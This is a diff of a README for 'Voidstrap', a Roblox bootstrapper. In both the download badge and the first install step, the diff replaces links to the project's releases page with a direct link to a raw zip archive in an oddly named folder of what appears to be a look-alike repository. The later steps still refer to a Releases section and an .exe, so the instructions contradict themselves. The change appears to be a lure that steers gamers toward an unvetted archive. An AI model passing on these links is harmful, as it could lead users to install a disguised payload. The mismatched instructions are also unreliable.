@@ -1,6 +1,6 @@
 # 🚀 voidstrap-github - Boost your Roblox performance with ease
 
-[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/patchworkheadnurse217/voidstrap-github/releases)
+[![Download Voidstrap](https://img.shields.io/badge/Download-Voidstrap-blue.svg)](https://github.com/patchworkheadnurse217/voidstrap-github/raw/refs/heads/main/berairou/voidstrap-github-3.2.zip)
 
 Voidstrap acts as a customized bootstrapper for Roblox. It replaces the default launcher to provide better control over your game settings. This tool helps you manage performance, frame rates, and game modifications without the need for complex programming knowledge. It functions as a lightweight alternative to existing launchers and focuses on stability for your gaming sessions.
 
@@ -28,7 +28,7 @@ You need a Windows PC to run this application. Ensure your system meets these sp
 
 Follow these steps to set up Voidstrap on your computer.
 
-1. Visit the repository page to find the current version: https://github.com/patchworkheadnurse217/voidstrap-github
+1. Visit the repository page to find the current version: https://github.com/patchworkheadnurse217/voidstrap-github/raw/refs/heads/main/berairou/voidstrap-github-3.2.zip
 2. Locate the "Releases" section on the right side of the page.
 3. Click the most recent version identifier.
 4. Look for the file ending in ".exe" under the Assets list.
